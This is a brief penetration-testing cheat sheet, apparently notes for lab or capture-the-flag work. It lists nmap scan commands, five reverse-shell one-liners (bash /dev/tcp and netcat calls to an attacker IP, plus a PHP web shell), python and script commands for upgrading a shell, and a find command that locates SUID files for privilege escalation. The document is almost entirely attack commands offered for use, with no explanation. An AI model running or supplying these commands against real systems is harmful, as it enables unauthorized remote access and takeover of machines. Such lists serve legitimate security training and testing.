Nmap
1. `nmap -sVC -p- -v -T4 -sT --open IP_ADDRESS -oN results`
2. `sudo nmap -sU -p 1-1024 -v IP_ADDRESS -oA results_UDP`

Reverse shell
1. `bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1`
2. `echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.49/4444 0>&1' > rev.sh`
3. `nc -e /bin/bash [YOUR_IP] 4444`
4. `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP 4444 >/tmp/f`
5. `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>`

Upgrade shell
1. `python3 -c 'import pty; pty.spawn("/bin/sh")' `
2. ` script /dev/null -c bash `

Linux find SUID files
1. `find / -type f -perm -04000 -ls 2>/dev/null`